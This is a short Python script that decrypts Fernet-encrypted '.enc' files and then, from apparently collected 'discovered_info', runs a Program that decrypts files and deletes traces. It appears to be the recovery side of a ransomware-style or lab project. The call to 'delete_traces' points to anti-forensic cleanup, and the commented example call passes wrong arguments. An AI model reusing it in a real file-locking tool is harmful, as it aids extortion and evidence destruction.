from cryptography.fernet import Fernet

def load_key():
    return open("secret.key", "rb").read()

def decrypt_file(encrypted_filename, fernet: Fernet, decryption: bool = True):
    if not decryption:
        return
    
    with open(encrypted_filename, "rb") as enc_file:
        encrypted = enc_file.read()

    decrypted = fernet.decrypt(encrypted)
    output_filename = encrypted_filename.split(".enc")[0]

    with open(output_filename, "wb") as dec_file:
        dec_file.write(decrypted)

    print(f"{encrypted_filename} has been decrypted to {output_filename}.")


if __name__ == "__main__":
    # key = load_key()
    # fernet = Fernet(key)
    # decrypt_file("mock files/a.txt", "mock files/a.txt", fernet)
    
    import platform
    from main import Program
    import json
    import os
    BASE = os.path.dirname(os.path.realpath(__file__))
    path = os.path.join(BASE, "discovered_info.json")

    with open(path, "r") as conf_file:
        data = json.load(conf_file)
        print(data)


    program = Program(data=data, mode="auto", system=platform.system())
    program.load_key()
    program.decrypt()
    program.delete_traces()
